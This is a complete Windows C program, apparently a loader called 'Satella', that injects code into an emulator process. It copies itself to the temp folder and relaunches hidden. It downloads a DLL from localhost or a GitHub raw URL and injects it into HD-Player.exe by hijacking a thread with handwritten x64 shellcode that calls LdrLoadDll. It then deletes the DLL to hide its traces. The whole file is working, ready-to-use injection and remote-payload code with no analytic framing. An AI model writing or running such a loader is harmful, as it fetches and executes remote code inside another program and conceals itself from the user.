#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

static DWORD FindProcess(const wchar_t* name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static BOOL DownloadDLL(const wchar_t* path) {
    HINTERNET sess = WinHttpOpen(L"S", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!sess) return FALSE;
    BOOL ok = FALSE;
    HINTERNET conn = WinHttpConnect(sess, L"127.0.0.1", 5000, 0);
    if (conn) {
        HINTERNET req = WinHttpOpenRequest(conn, L"GET", L"/api/download", NULL, NULL, NULL, 0);
        if (req) {
            if (WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(req, NULL)) {
                DWORD st = 0, sz = sizeof(st);
                WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sz, NULL);
                if (st == 200) {
                    HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (f != INVALID_HANDLE_VALUE) {
                        BYTE buf[8192]; DWORD rd = 0;
                        while (WinHttpReadData(req, buf, sizeof(buf), &rd) && rd > 0) {
                            DWORD wr; WriteFile(f, buf, rd, &wr, NULL);
                        }
                        CloseHandle(f); ok = TRUE;
                    }
                }
            }
            WinHttpCloseHandle(req);
        }
        WinHttpCloseHandle(conn);
    }
    if (!ok) {
        HINTERNET conn2 = WinHttpConnect(sess, L"raw.githubusercontent.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (conn2) {
            HINTERNET req2 = WinHttpOpenRequest(conn2, L"GET", L"/semataryiscrazy/xicara-de-cafe/refs/heads/main/Satella.dll", NULL, NULL, NULL, WINHTTP_FLAG_SECURE | WINHTTP_FLAG_REFRESH);
            if (req2) {
                DWORD prot = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
                WinHttpSetOption(req2, WINHTTP_OPTION_SECURE_PROTOCOLS, &prot, sizeof(prot));
                if (WinHttpSendRequest(req2, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(req2, NULL)) {
                    DWORD st = 0, sz = sizeof(st);
                    WinHttpQueryHeaders(req2, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sz, NULL);
                    if (st == 200) {
                        HANDLE f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        if (f != INVALID_HANDLE_VALUE) {
                            BYTE buf[8192]; DWORD rd = 0;
                            while (WinHttpReadData(req2, buf, sizeof(buf), &rd) && rd > 0) {
                                DWORD wr; WriteFile(f, buf, rd, &wr, NULL);
                            }
                            CloseHandle(f); ok = TRUE;
                        }
                    }
                }
                WinHttpCloseHandle(req2);
            }
            WinHttpCloseHandle(conn2);
        }
    }
    WinHttpCloseHandle(sess);
    return ok;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    wchar_t self[MAX_PATH], tmp[MAX_PATH], tmpSelf[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    GetTempPathW(MAX_PATH, tmp);
    lstrcpyW(tmpSelf, tmp); lstrcatW(tmpSelf, L"Satella.exe");
    if (lstrcmpiW(self, tmpSelf) != 0) {
        CopyFileW(self, tmpSelf, FALSE);
        ShellExecuteW(NULL, NULL, tmpSelf, NULL, NULL, SW_HIDE);
        return 0;
    }

    DWORD pid = 0;
    for (int i = 0; i < 60 && pid == 0; i++) {
        pid = FindProcess(L"HD-Player.exe");
        if (pid == 0) Sleep(1000);
    }
    if (pid == 0) return 0;

    wchar_t dllPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dllPath);
    lstrcatW(dllPath, L"Satella_XXXX.dll");
    wchar_t* pp = wcsstr(dllPath, L"XXXX");
    if (pp) wsprintfW(pp, L"%04X", GetTickCount() & 0xFFFF);
    if (!DownloadDLL(dllPath)) return 0;

    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) { DeleteFileW(dllPath); return 0; }

    // Get LdrLoadDll address (same address in all processes)
    UINT_PTR pLdrLoadDll = (UINT_PTR)GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll");
    if (!pLdrLoadDll) { CloseHandle(hp); DeleteFileW(dllPath); return 0; }

    // Layout in remote memory (rbx = base):
    // [rbx+0x000] shellcode
    // [rbx+0x100] pLdrLoadDll (8 bytes)
    // [rbx+0x108] dllPath (WCHAR[260] = 520 bytes)
    // [rbx+0x308] UNICODE_STRING.Length (2) + MaxLength (2) + pad (4) + Buffer (8) = 16
    // [rbx+0x318] hModule (8 bytes, output)
    // [rbx+0x328] originalRIP (8 bytes, from the hijacked thread)
    // [rbx+0x330] originalRSP (8 bytes, from the hijacked thread)
    SIZE_T totalSize = 0x340;

    // Shellcode: saves all registers, calls LdrLoadDll, restores all, jumps back to original RIP
    BYTE sc[] = {
        0x48,0x89,0xCB,                          // mov rbx, rcx     (rbx = base address, preserved)
        0x50,                                     // push rax
        0x51,                                     // push rcx
        0x52,                                     // push rdx
        0x41,0x50,                                // push r8
        0x41,0x51,                                // push r9
        0x41,0x52,                                // push r10
        0x41,0x53,                                // push r11
        0x53,                                     // push rbx
        0x55,                                     // push rbp
        0x57,                                     // push rdi
        0x56,                                     // push rsi
        0x48,0x89,0xE5,                          // mov rbp, rsp
        0x48,0x83,0xE4,0xF0,                     // and rsp, -16    (align stack)
        0x48,0x83,0xEC,0x28,                     // sub rsp, 28h    (shadow space)
        0x33,0xC9,                                // xor ecx, ecx    (Path=NULL)
        0x33,0xD2,                                // xor edx, edx    (Flags=NULL)
        0x4C,0x8D,0x83,0x08,0x03,0x00,0x00,      // lea r8, [rbx+0x308] (&us)
        0x4C,0x8D,0x8B,0x18,0x03,0x00,0x00,      // lea r9, [rbx+0x318] (&hModule)
        0x48,0x8B,0x83,0x00,0x01,0x00,0x00,      // mov rax, [rbx+0x100] (pLdrLoadDll)
        0xFF,0xD0,                                // call rax
        0x48,0x8B,0xE5,                          // mov rsp, rbp    (restore stack)
        0x5E,                                     // pop rsi
        0x5F,                                     // pop rdi
        0x5D,                                     // pop rbp
        0x5B,                                     // pop rbx
        0x41,0x5B,                                // pop r11
        0x41,0x5A,                                // pop r10
        0x41,0x59,                                // pop r9
        0x41,0x58,                                // pop r8
        0x5A,                                     // pop rdx
        0x59,                                     // pop rcx
        0x58,                                     // pop rax
        0x48,0x8B,0x8B,0x28,0x03,0x00,0x00,      // mov rcx, [rbx+0x328] (original RIP)
        0x48,0x8B,0x93,0x30,0x03,0x00,0x00,      // mov rdx, [rbx+0x330] (original RSP)
        0x48,0x89,0xD4,                          // mov rsp, rdx    (restore original RSP)
        0xFF,0xE1                                 // jmp rcx         (jump to original RIP)
    };

    // Allocate in HD-Player
    LPVOID remoteMem = VirtualAllocEx(hp, NULL, totalSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) { CloseHandle(hp); DeleteFileW(dllPath); return 0; }

    // Write shellcode
    WriteProcessMemory(hp, remoteMem, sc, sizeof(sc), NULL);
    // Write pLdrLoadDll
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x100, &pLdrLoadDll, 8, NULL);
    // Write DLL path
    DWORD pathLen = lstrlenW(dllPath);
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x108, dllPath, (pathLen + 1) * sizeof(WCHAR), NULL);
    // Write UNICODE_STRING at 0x308
    USHORT usLen = pathLen * sizeof(WCHAR);
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x308, &usLen, 2, NULL);       // Length
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x30A, &usLen, 2, NULL);       // MaxLength
    UINT_PTR bufPtr = (UINT_PTR)remoteMem + 0x108;
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x310, &bufPtr, 8, NULL);      // Buffer
    // Zero hModule
    UINT_PTR zero = 0;
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x318, &zero, 8, NULL);

    // Find a thread in HD-Player
    HANDLE hThread = NULL;
    DWORD tid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(snap, &te)) do {
            if (te.th32OwnerProcessID == pid) {
                hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) { tid = te.th32ThreadID; break; }
            }
        } while (Thread32Next(snap, &te));
        CloseHandle(snap);
    }

    if (!hThread) { VirtualFreeEx(hp, remoteMem, 0, MEM_RELEASE); CloseHandle(hp); DeleteFileW(dllPath); return 0; }

    // Suspend thread and hijack it
    SuspendThread(hThread);
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread); CloseHandle(hThread);
        VirtualFreeEx(hp, remoteMem, 0, MEM_RELEASE); CloseHandle(hp); DeleteFileW(dllPath); return 0;
    }

    // Save original RIP and RSP
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x328, &ctx.Rip, 8, NULL);
    WriteProcessMemory(hp, (BYTE*)remoteMem + 0x330, &ctx.Rsp, 8, NULL);

    // Modify thread to execute our shellcode
    ctx.Rip = (DWORD64)remoteMem;
    ctx.Rcx = (DWORD64)remoteMem; // parameter
    ctx.ContextFlags = CONTEXT_FULL;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    CloseHandle(hThread);
    Sleep(5000);

    // Cleanup: free remote memory (DLL stays loaded)
    // Actually we can free the shellcode memory since execution already finished
    // But it's safer to leave it (it's only a few hundred bytes)
    // VirtualFreeEx(hp, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hp);
    DeleteFileW(dllPath);
    return 0;
}
